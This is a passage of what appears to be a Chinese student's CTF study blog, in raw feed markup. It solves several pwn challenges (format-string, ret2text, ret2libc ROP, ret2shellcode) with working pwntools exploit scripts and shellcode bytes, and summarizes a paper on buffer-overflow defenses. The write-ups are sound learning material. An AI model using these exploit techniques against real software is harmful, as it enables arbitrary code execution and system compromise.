href="#1、题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）" class="headerlink" title="1、题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）"></a>1、题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）</h3><p>首先对文件进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-4.png"></p><p>程序开启了canary保护和NX保护，由此无法对其使用覆盖返回地址和插入shellcode方法，将程序放入ida进行反汇编：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-5.png"></p><p>由此我们注意到的是程序中存在system(“bin&#x2F;sh”)函数，接着我们对整个程序进行分析，我们要执行system(“bin&#x2F;sh”)函数的话，就必须使unk_804c044这个变量的值与atoi(&amp;nptr)相等，由前面的函数可以知道unk_804c044这个变量的值为随机生成的，由于我们后面还会进行输入，所以我们可以使用格式化字符串漏洞的方法来对这个变量进行改变</p><p>首先我们得先检测出我们输入的参数的偏移位置：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-6.png"></p><p>可以看到aaaa对应的ASCII值为61616161，我们发现aaaa对应的参数的位置为偏移10位，然后使用%10$n这个方法将变量的地址p32(0x0804c044)写入到第一个参数（偏移10位的地址）上去，exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25903</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804c044</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的结果忘记截图，但已经打通：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-7.png"></p><h3 id="2、jarvisoj-fm（格式化字符串漏洞）"><a href="#2、jarvisoj-fm（格式化字符串漏洞）" class="headerlink" title="2、jarvisoj_fm（格式化字符串漏洞）"></a>2、jarvisoj_fm（格式化字符串漏洞）</h3><p>首先对程序进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-1.png">)</p><p>发现开启了canary保护和NX保护，首先就可以排除掉插入shellcode和返回函数，将程序放入ida进行反编译：<img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-2.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-3.png"></p><p>很明显，system函数直接暴露在了我们的面前，只需要x满足等于4时即可，通过观察发现x为一个全局变量，我们通过多次运行程序，发现x的默认值为3，接下来的操作主要是找到x的地址，然后将其修改成4即可，这里与之前不同的是，我们在这次用到了fmtstr_payload(偏移，{adds1：value1})，这是32位程序常用的方法，可以构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./fm'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26987</span><span class="token punctuation">)</span>x_addr <span class="token operator">=</span> <span class="token number">0x0804A02C</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>x_addr<span class="token punctuation">:</span><span class="token number">0x4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终打通的结果如下：</p><p> <img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-4.png"></p><h3 id="3、知识点总结与解题心得"><a href="#3、知识点总结与解题心得" class="headerlink" title="3、知识点总结与解题心得"></a>3、知识点总结与解题心得</h3><p>首先我们判断是不是存在格式化字符串漏洞，我们的得明白触发该漏洞的函数都有哪些，发现了漏洞我们又该怎么去构造脚本去攻击这个程序，下面是我在解决题目的过程中总结的知识点，其中也包括对不同的程序（32位和64位）使用不同的方法构造脚本攻击。</p><p><strong>1、触发该漏洞的函数非常有限，主要有printf,sprintf,fprintf等c库中print家族的函数.</strong></p><p><strong>2、常见的格式化字符串语法：</strong></p><ul><li>%d - 十进制 - 打印十进制整数</li><li>%s - 字符串 - 打印参数地址处的字符串</li><li>%x,%X- 十六进制 - 打印十六进制数</li><li>%o - 八进制 -打印八进制整形</li><li>%c - 字符 - 打印字符</li><li>%p - 指针 - 打印指针地址 即void *</li><li>%n - 到目前为止所写的字符数</li></ul><p><strong>3、32位&#x2F;64位程序在函数调用时的区别：</strong></p><p>32位程序，函数调用时参数在栈：格式化字符可控可以泄露栈上的数据<br>64位程序，函数调用使用寄存器＋栈：格式化字符可控可以泄露特定寄存器和栈上的值（前6个参数放在寄存器上，会先依次打印出寄存器上的值。</p><h2 id="四、知识点拓展"><a href="#四、知识点拓展" class="headerlink" title="四、知识点拓展"></a>四、知识点拓展</h2><p>既然我们知道了程序在编写的过程中，函数没有用对的话，会存在一定的漏洞，我就试图自己去构建一个存在漏洞程序，然后自己去写脚本攻击。</p><p>随机写的一个函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hack Success!!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello,Please Start Hack!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上面的代码可知，我们设置了明显的栈溢出漏洞，即scanf(“%s”,buf) ，我们可以看到主函数里面没有对hack函数去进行调用，我们要做的就是让程序去执行这个函数，接着我们通过进行gdb调试，对我们的程序进行攻击，让这个程序去执行hack函数，接着我们开始进行调试：</p><p>首先将程序编写成32位：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-1.png"></p><p>运行一下程序：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-2.png"></p><p>当我们输入的字符串没有超过20的时候，程序不会进行报错，当我们输入的字符串长度超过了缓冲区的范围时，会提示我们出现了错误。</p><p>开始进行gdb调试：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-3.png"></p><p>在main函数处设置断点，然后一步步执行，查看堆栈的情况：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-4.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-5.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-6.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-7.png"></p><p>通过上面的图示，我们可以我们0xffffd05c的值指向0xf7da03b5，也就是说返回地址为0xf7da03b5，接着我们输入命令info address hack命令获得hack函数的地址0x5655619d，然后我们通过改变0xffffd05c指向的值让程序去执行hack函数。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-8.png"></p><p>我们可以看到最终的结果打印出了Hack Success!!!!，说明程序已经成功执行了hack函数。</p><p>这次的实践过程实现了程序简单的栈溢出漏洞，算是对论文作者提到的格式化字符串漏洞的一种拓展和延伸，经过这次实践之后，我以后在写代码的过程中也会多多注意代码的撰写，尽量避免危险函数，如果我们上述的hack函数是system（’&#x2F;bin&#x2F;sh’）的话，那么就可能对我们的电脑造成更大的破坏，黑客就会获得主机的shell权限，对数据进行获取破坏。</p><h3 id="拓展知识点的实战演练"><a href="#拓展知识点的实战演练" class="headerlink" title="拓展知识点的实战演练"></a>拓展知识点的实战演练</h3><h4 id="1、CTFHub—ret2text"><a href="#1、CTFHub—ret2text" class="headerlink" title="1、CTFHub—ret2text"></a>1、CTFHub—ret2text</h4><p>首先对文件进行分析，获得的结果如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1.png"></p><p>发现其为64位的文件</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-2.png"></p><p>发现没有开启任何的保护，将其直接代入IDA进行反汇编操作</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-3.png"></p><p>发现经典的gets危险函数，可以实现<strong>栈溢出</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-4.png"></p><p>通过观察到secure函数中存在着&#x3D;&#x3D;system(“&#x2F;bin&#x2F;sh”)&#x3D;&#x3D;函数，以此我们可以找到system函数的地址，同时将v4的值进行溢出，返回执行指定的system函数</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-5.png"></p><p>获得的system函数的地址为0x004007b8</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-6.png"></p><p>由此我们可以计算对v4需要填充的无用数据长度为0x70+8,然后我们开始写exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#p = process('./pwn2')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challenge-dda26e33984a0d6c.sandbox.ctfhub.com"</span><span class="token punctuation">,</span><span class="token number">35387</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x004007B8</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于之前已经打通，忘记了截图，直接在本地的机子上执行，运行结果如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-7.png"></p><h4 id="2、BUUCTF—pwn1-sctf-2016"><a href="#2、BUUCTF—pwn1-sctf-2016" class="headerlink" title="2、BUUCTF—pwn1_sctf_2016"></a>2、BUUCTF—pwn1_sctf_2016</h4><p>首先对文件进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-8.png"></p><p>发现文件是一个32位的程序，同时开启了NX保护，将文件代入IDA进行反汇编操作</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-9.png"></p><p>由图可知,我们知道了对s变量开辟的空间为60个字节,但是fgets函数对我们限制输入32个字节,开始以为是不会造成栈溢出,但后面出现了字符替换,即将字符’I’替换成’you’,我们可以输入20个’I’,就可以实现栈溢出. </p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-10.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-11.png"></p><p>然后我们发现了get_flag函数，里面存在着system函数，就此我们可以找到system函数的地址：0x08048f0d</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-12.png"></p><p>接着我们就可以写exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment">#p = process('./pwn5')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27974</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'I'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08048f0d</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于之前已经打通，直接在本机执行，执行结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-13.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-14.png"></p><h4 id="3、题目来源—BUUCTF（-OGeek2019-babyrop）"><a href="#3、题目来源—BUUCTF（-OGeek2019-babyrop）" class="headerlink" title="3、题目来源—BUUCTF（[OGeek2019]babyrop）"></a>3、题目来源—BUUCTF（[OGeek2019]babyrop）</h4><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-1.png"></p><p>可以发现程序开启了NX保护，但没有开启canary保护，我们将程序放入ida中分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-2.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-3.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-4.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-5.png"></p><p>主函数main调用了几个子函数，第一个函数对于整体并没有什么影响，所以我们不用管这个，接着对参数a1的值是由前面的函数随机生成，然后用我们进行输入的字符与其进行比较，若没有相同的字符，则整个程序退出，由于是随机生成，所以我们无法让输入的buf与s相等，但我们可以更改v1的值，判断使它们的相同字符为0,我们可以在输入的buf第一个字符输入’\x00’这样就可以绕过strlen函数，由于程序中也没有找到system和binsh这样的字符，所以我们这是个明显的libc问题，构建的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">29820</span><span class="token punctuation">)</span><span class="token comment"># r = process('./babyrop')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/hu/桌面/babyrop'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token operator">+</span><span class="token string">b'\xff'</span><span class="token operator">*</span><span class="token number">7</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> <span class="token number">0x08048825</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>payload3 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终在本地打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-6.png"></p><h2 id="五、相关文献阅读（Survey-of-Protections-from-Buffer-Overflow-Attacks）"><a href="#五、相关文献阅读（Survey-of-Protections-from-Buffer-Overflow-Attacks）" class="headerlink" title="五、相关文献阅读（Survey of Protections from Buffer-Overflow Attacks）"></a>五、相关文献阅读（Survey of Protections from Buffer-Overflow Attacks）</h2><p>由Krerk Piromsopa和Richard J Enbody编写的Survey of Protections from Buffer-Overflow Attacks（缓冲区溢出攻击综述），论文先是向我们介绍了缓冲区溢出攻击的原理，接着介绍了如何对缓冲区溢出攻击做出防御，文章总共提出了四种解决方案，第一个是Correct Code（即使用正确的代码）、第二个是Static Analysis（即静态分析）、第三个是Dynamic Solutions（即动态解决方案）、第四个是Isolation（即隔离）。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/pwn-9.png"></p><p>第一个方法：Correct Code，这个办法很好理解，就是我们在编写程序的过程中，尽量避免使用危险函数，但是编写正确的代码也不是万能的解决办法，就比如说论文里面提到的Windows WMF漏洞，允许攻击者通过图像进行工作元数据以执行任意代码，即完全控制。</p><p>第二个方法：Static analysis，这个方法就是给定一组已知的漏洞，我们通过修复或替换易受攻击的功能，我们在部署程序之前，可以应用静态分析发现和解决潜在问题，比如说，我们知道C语言中的“strcpy”函数是一个没有边界的字符串复制函数检查，如果怀疑缓冲区溢出，我们可以创建一个配置文件来搜索该函数的任何使用并警告程序员潜在的威胁。<br>通用的静态分析算法：<br>1、打开签名文件<br>2、搜索目标源代码以获取签名代码<br>3、if（找到签名）替换为不易受攻击的代码</p><p>第三个方法：Dynamic Solutions，由于攻击者的目标是控制数据，验证这些数据的完整性将使我们能够检测缓冲区溢出攻击。我们将这类保护方案称为“动态解决方案”，因为系统在执行期间动态地管理和验证数据。</p><p>第四个方法：Isolation，隔离方案限制了攻击造成的损害，而不是阻止攻击。因此，他们保护不限于缓冲区溢出攻击。通过创建电子幕，隔离方案可以防止攻击向量或限制攻击造成的损害。例如，可以防止内存的某一部分（例如，堆栈）用作可执行代码（即NX）的存储。或者，我们可以监禁访问内存的其他部分以控制损坏（即Sanboxing小程序）。与动态解决方案一样，隔离可以在软件中实现，也可以在硬件。</p><p>读完整篇论文，总的来说，每一种防止缓冲区溢出攻击的解决方案都要付出一定的代价。此外，随着攻击的成熟，一些解决方案已被证明不足以提供全面保护针对各种类型的攻击。特别是，可证明正确的代码应该消除缓冲区溢出（以及大多数其他错误）。然而，目前这些技术尚未得到广泛应用，因此易受攻击的代码仍然存在。我们得出结论，除了编写正确的代码之外，没有任何解决方案在每个方面都是完美的。</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>通过仔细阅读完这两篇论文之后，我的整体感受还可以，收获比较大，我对linux下的二进制漏洞理解的更加深刻，同时我也会在之后写代码的过程中尽量去避免使用危险函数，我也学会了如何对存在漏洞的程序进行攻击与防御，学到了多种方法去防御和修补漏洞，我们也不应该只会一种方法去实现防御，还应该注重多种方法相结合，这样的代价会最小化，当然上面介绍的方法有的我已经付诸实践了，还有的方法我只停留在了理论方面，还需要多加练习，之后我也会多多进行刷题训练来进一步提升自己的个人能力。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第二周笔记</title>
      <link href="/uncategorized/%E7%AC%AC%E4%BA%8C%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/uncategorized/%E7%AC%AC%E4%BA%8C%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="1-题目来源—ctfhub，ret2shellcode"><a href="#1-题目来源—ctfhub，ret2shellcode" class="headerlink" title="1. 题目来源—ctfhub，ret2shellcode"></a>1. 题目来源—ctfhub，ret2shellcode</h3><p>首先进行对程序进行分析，发现程序为64位，没有开启任何保护。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-1.png"></p><p>直接放入ida64位进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-2.png"></p><p>发现buf地址已知，存在栈溢出，发现没有携带system（“bin&#x2F;sh”）函数 ，且由于buf地址过小，我们可以选择把shellcode放在返回地址后面，然后将返回地址给替代成shellcode的地址，exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span><span class="token comment"># p = remote("challenge-42eb06e24ab5dbd8.sandbox.ctfhub.com",24513)</span><span class="token comment">#shellcode = asm(shellcraft.amd64.sh())</span><span class="token comment">#print(shellcode)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>buf_address <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input someting : '</span><span class="token punctuation">)</span>shell<span class="token operator">=</span><span class="token string">b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>buf_address<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> shellp<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后获得flag（忘记截图，在本地执行结果如下）：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-3.png"></p><h3 id="2-题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）"><a href="#2-题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）" class="headerlink" title="2. 题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）"></a>2. 题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）</h3><p>首先对文件进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-4.png"></p><p>程序开启了canary保护和NX保护，由此无法对其使用覆盖返回地址和插入shellcode方法，将程序放入ida进行反汇编：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-5.png"></p><p>由此我们注意到的是程序中存在system(“bin&#x2F;sh”)函数，接着我们对整个程序进行分析，我们要执行system(“bin&#x2F;sh”)函数的话，就必须使unk_804c044这个变量的值与atoi(&amp;nptr)相等，由前面的函数可以知道unk_804c044这个变量的值为随机生成的，由于我们后面还会进行输入，所以我们可以使用格式化字符串漏洞的方法来对这个变量进行改变</p><p>首先我们得先检测出我们输入的参数的偏移位置：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-6.png"></p><p>可以看到aaaa对应的ASCII值为61616161，我们发现aaaa对应的参数的位置为偏移10位，然后使用%10$n这个方法将变量的地址p32(0x0804c044)写入到第一个参数（偏移10位的地址）上去，exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25903</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804c044</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的结果忘记截图，但已经打通：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-7.png"></p><h4 id="字符串漏洞知识点总结："><a href="#字符串漏洞知识点总结：" class="headerlink" title="字符串漏洞知识点总结："></a>字符串漏洞知识点总结：</h4><p><strong>1、</strong>触发该漏洞的函数非常有限，主要有printf,sprintf,fprintf等c库中print家族的函数.</p><p><strong>2、</strong>常见的格式化字符串语法：</p><ul><li>%d - 十进制 - 打印十进制整数</li><li>%s - 字符串 - 打印参数地址处的字符串</li><li>%x,%X- 十六进制 - 打印十六进制数</li><li>%o - 八进制 -打印八进制整形</li><li>%c - 字符 - 打印字符</li><li>%p - 指针 - 打印指针地址 即void *</li><li>%n - 